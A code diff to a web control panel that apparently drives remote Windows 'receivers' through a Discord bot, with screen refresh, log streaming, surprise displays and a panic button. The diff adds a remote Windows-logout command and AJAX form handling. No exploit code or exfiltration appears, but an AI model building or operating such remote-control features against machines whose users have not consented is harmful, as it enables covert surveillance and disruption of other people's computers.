@@ -228,6 +228,7 @@ CONTROL_HTML = """<!doctype html>
         <button class="tab-btn" data-tab="openclose">Open & Close :3</button>
         <button class="tab-btn" data-tab="volume">Volume ;0</button>
         <button class="tab-btn" data-tab="logs">Logs</button>
+        <button class="tab-btn" data-tab="remotes">remote's</button>
       </div>
       <div class="tab-pane active" data-tab="surprise">
         <h1>Display Surprise</h1>
@@ -293,6 +294,15 @@ CONTROL_HTML = """<!doctype html>
           overflow:auto;
           font-size:13px;
         ">Waiting for logs…</pre>
+      </div>
+      <div class="tab-pane" data-tab="remotes">
+        <h1>Remote's</h1>
+        <p style="color:var(--muted); margin-bottom:12px;">
+          Log out the current Windows session on the selected receiver.
+        </p>
+        <form method="post" action="/ui/logout">
+          <button class="secondary" type="submit">Log Out</button>
+        </form>
       </div>
     </div>
     <div class="card">
@@ -369,6 +379,7 @@ CONTROL_HTML = """<!doctype html>
           const selectForm = document.createElement('form');
           selectForm.method = 'post';
           selectForm.action = '/ui/select/' + encodeURIComponent(rec.id);
+          wireForm(selectForm);
           const btn = document.createElement('button');
           btn.type = 'submit';
           btn.textContent = rec.name || rec.tag || rec.id;
@@ -381,6 +392,7 @@ CONTROL_HTML = """<!doctype html>
           const renameForm = document.createElement('form');
           renameForm.method = 'post';
           renameForm.action = '/ui/rename/' + encodeURIComponent(rec.id);
+          wireForm(renameForm);
           const input = document.createElement('input');
           input.type = 'text';
           input.name = 'alias';
@@ -427,6 +439,33 @@ CONTROL_HTML = """<!doctype html>
         }
       } catch (e) { /* ignore */ }
     }
+    async function submitFormNoReload(form) {
+      const method = (form.method || 'post').toUpperCase();
+      const data = new FormData(form);
+      try {
+        const res = await fetch(form.action, { method, body: data });
+        if (!res.ok) {
+          alert('Request failed.');
+          return false;
+        }
+        return true;
+      } catch (e) {
+        alert('Request failed.');
+        return false;
+      }
+    }
+    function wireForm(form) {
+      if (!form || form.dataset.ajaxBound) return;
+      form.dataset.ajaxBound = '1';
+      form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const ok = await submitFormNoReload(form);
+        if (!ok) return;
+        if (form.action.includes('/ui/rename') || form.action.includes('/ui/select')) {
+          refreshReceivers();
+        }
+      });
+    }
     // tabs
     const tabButtons = document.querySelectorAll('.tab-btn');
     const tabPanes = document.querySelectorAll('.tab-pane');
@@ -444,6 +483,11 @@ CONTROL_HTML = """<!doctype html>
     setInterval(refreshScreen, 4000);
     setInterval(refreshLogs, 5000);
 
+    document.querySelectorAll('.app form').forEach(form => {
+      if (form.id === 'pin-form') return;
+      wireForm(form);
+    });
+
     const panicBtn = document.getElementById('panic-btn');
     if (panicBtn) {
       panicBtn.addEventListener('click', async () => {
@@ -459,7 +503,8 @@ CONTROL_HTML = """<!doctype html>
             alert('Panic request failed.');
             return;
           }
-          window.location.reload();
+          alert('Panic request sent.');
+          refreshReceivers();
         } catch (e) {
           alert('Panic request failed.');
         }
@@ -640,6 +685,13 @@ async def ui_logs_stop():
     if not await _wait_controller_ready():
         return HTMLResponse("Discord bot not ready", status_code=503)
     await _send_cmd(_cmd_with_selection("LOGS_STOP"))
+    return RedirectResponse(url="/", status_code=303)
+
+@app.post("/ui/logout")
+async def ui_logout():
+    if not await _wait_controller_ready():
+        return HTMLResponse("Discord bot not ready", status_code=503)
+    await _send_cmd(_cmd_with_selection("LOGOUT"))
     return RedirectResponse(url="/", status_code=303)
 
 @app.post("/ui/open")
